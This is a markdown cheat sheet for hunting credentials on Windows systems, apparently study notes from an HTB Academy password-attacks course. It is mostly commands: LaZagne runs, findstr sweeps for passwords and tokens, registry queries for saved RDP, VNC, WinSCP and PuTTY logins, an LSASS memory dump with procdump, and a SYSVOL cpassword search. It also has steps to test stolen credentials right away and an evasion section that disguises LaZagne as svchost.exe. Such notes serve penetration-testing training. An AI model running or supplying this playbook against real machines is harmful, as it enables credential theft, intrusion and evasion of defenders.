# 🛰️ Credential Hunting in Windows Environments

## 🔍 Overview and Initial Assessment

### Contextual Identification
- **System Purpose**: Identify if it's a user workstation, developer machine, or admin server.
- **Installed Applications**: Notable applications like Git, SSH clients, database tools.
- **User Privilege Level**: Determine if the user is an administrator, service account, or regular user.
- **Network Connectivity**: Check for internet access and other network services.

### Initial Steps
```cmd
# Identify installed software
wmic product get name

# Check running processes
tasklist /v | findstr ssh\|ftp\|smb

# Network connectivity check
ping -n 1 google.com
```

## 🚀 Automated Tools

### LaZagne for Windows Credential Hunting
```cmd
# Transfer and run LaZagne
copy \\server\lazagne.zip C:\temp\
cd C:\temp\
powershell -Command "Expand-Archive .\lazagne.zip ."
C:\temp\Lazagne.exe sysadmin          # IT tools (WinSCP, PuTTY, etc.)
C:\temp>Lazagne.exe mail              # Email credentials
C:\temp>Lazagne.exe databases         # Database connections
```

### Tool Output Analysis
```bash
[!INFO] Save LaZagne output to file:
LaZagne.exe > lazagne_output.txt

# Check for high-value modules
findstr /I "ssh\|ftp\|database" lazagne_output.txt
```

## 🔍 Manual File System Search

### Common Credential Patterns
```cmd
# Use findstr to search for common patterns
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.ps1 *.yml *.json
```

### Network Infrastructure Credentials
```cmd
findstr /SIM /C:"ssh" /C:"telnet" /C:"router" /C:"switch" *.txt *.cfg *.ps1
```

### Development Environment Credentials
```cmd
findstr /SIM /C:"api_key" /C:"secret" /C:"token" /C:"connectionstring" *.config *.json *.xml
```

## 🔍 Registry and System Analysis

### Stored Credentials in Windows
```cmd
# Check for stored credentials
cmdkey /list
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"

# VNC passwords
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v password

# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

### Application-Specific Searches
```cmd
# WinSCP sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 1\Sessions"

# PuTTY sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## 🛠️ Browser Credential Extraction

### Chrome and Firefox Credentials
```cmd
# Chrome passwords (requires user context)
LaZagne.exe browsers -v | findstr -i chrome

# Firefox manual search
findstr /SIM "password" -C:"\*.txt" -C:"config\*.json"
```

## 🛠️ Network Administration Tools

### WinSCP and PuTTY Credentials
```cmd
# WinSCP stored sessions
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions"

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

## 🛠️ Development Environment Credentials

### Git and Database Connections
```cmd
# Git credentials
findstr /SIM "github" *.txt *.ps1 *.bat

# Database connection strings
findstr /SIM "server=" "uid=" "password=" *.config *.xml *.json
```

## 🔍 Advanced Discovery Techniques

### Memory-Based Credential Extraction
```cmd
# Process memory dumps (requires elevated privileges)
procdump -ma lsass.exe lsass.dmp

# KeePass memory extraction
LaZagne.exe memory -v
```

### Network Share Enumeration
```cmd
# Local shares
net share

# Domain shares
net view \\domain-controller

# SYSVOL search for Group Policy passwords
findstr /S /I cpassword \\domain.local\sysvol\domain.local\*.xml
```

## 🔍 Alternative Data Streams and Hidden Files
```cmd
# Check for alternate data streams
dir /R C:\Users\%USERNAME%\Documents\

# Hidden files search
dir /AH /S C:\Users\%USERNAME\

# System files containing credentials
type C:\Windows\Panther\unattend.xml | findstr /i password
```

## 📑 Documentation and Validation

### Credential Organization
```bash
# Create structured credential inventory
Date: [timestamp]
Target: [hostname/IP]
User Context: [username/privileges]

Found Credentials:
[Service/Application] | [Username] | [Password/Hash] | [Location] | [Validated]
SSH Switches         | netadmin   | P@ssw0rd123    | config.txt | YES
GitLab              | developer  | token123       | browser    | NO
WinSCP              | admin      | secret456      | registry   | YES
```

### Immediate Validation
```cmd
# Test SSH credentials
ssh username@target-ip

# Test WinSCP/FTP credentials
ftp target-ip

# Test database connections
sqlcmd -S server -U username -P password -Q "SELECT @@VERSION"

# Test web application access
curl -u username:password https://target/api/test
```

## 🛡️ Detection and Evasion

### Common Detection Methods
- **File access monitoring** - Unusual file access patterns.
- **Process monitoring** - LaZagne execution.
- **Network monitoring** - Data exfiltration.
- **Registry monitoring** - Credential store access.

### Evasion Techniques
```cmd
# Use legitimate Windows tools
findstr instead of custom tools when possible

# Rename LaZagne
ren LaZagne.exe svchost.exe

# Use PowerShell for stealth
Get-Content -Path "file.txt" | Select-String "password"

# Time-delay searches
timeout /t 5 && findstr /SIM "password" *.txt
```

## 🎯 Success Metrics and Validation

### Credential Quality Assessment
```bash
# Test discovered credentials immediately
net use \\target\share /user:domain\username password

# SSH validation
ssh username@target_ip

# Database connection test
sqlcmd -S server -U username -P password
```

### Documentation Format
```bash
# Credential Discovery Log
Date: [timestamp]
Target: [hostname/IP]
Method: [LaZagne/findstr/manual]
Location: [file path/registry key]
Credential: [username:password]
Service: [SSH/WinSCP/GitLab/etc]
Validated: [Yes/No]
```

## 📋 Quick Reference Checklist

### Initial Assessment
- **[!CHECK]** Identify system purpose (admin/dev/user workstation)
- **[!CHECK]** Note installed applications
- **[!CHECK]** Check user privilege level
- **[!CHECK]** Identify network connectivity

### Automated Tools
- **[!CHECK]** Transfer and run LaZagne with all modules
- **[!CHECK]** Save LaZagne output to file
- **[!CHECK]** Focus on high-value modules (browsers, sysadmin, windows)

### Manual Searches
- **[!CHECK]** findstr for common password patterns
- **[!CHECK]** Search user Documents and Desktop
- **[!CHECK]** Check Downloads folder for password files
- **[!CHECK]** Review browser bookmarks for service URLs

### Advanced Techniques  
- **[!CHECK]** Registry searches for stored credentials
- **[!CHECK]** Network share enumeration (if domain-joined)
- **[!CHECK]** Configuration file analysis
- **[!CHECK]** Memory dumps (if elevated privileges)

### Validation
- **[!CHECK]** Test discovered credentials immediately
- **[!CHECK]** Document all findings with timestamps
- **[!CHECK]** Note credential sources for reporting
- **[!CHECK]** Identify high-value targets for further exploitation

## 💡 Key Takeaways

1. **Context is king** - Understanding the system's purpose guides search strategy.
2. **LaZagne is powerful** - 60+ modules make it essential for Windows credential hunting.
3. **findstr is versatile** - Native tool with powerful pattern matching.
4. **Multiple approaches** - Combine automated tools with manual searches.
5. **Document everything** - Track credential sources and validation status.
6. **Test immediately** - Validate credentials as soon as they're found.
7. **Think like the user** - Where would you store passwords if you were them?

---

*This guide provides comprehensive coverage of credential hunting techniques for Windows environments, based on HTB Academy's Password Attacks module.*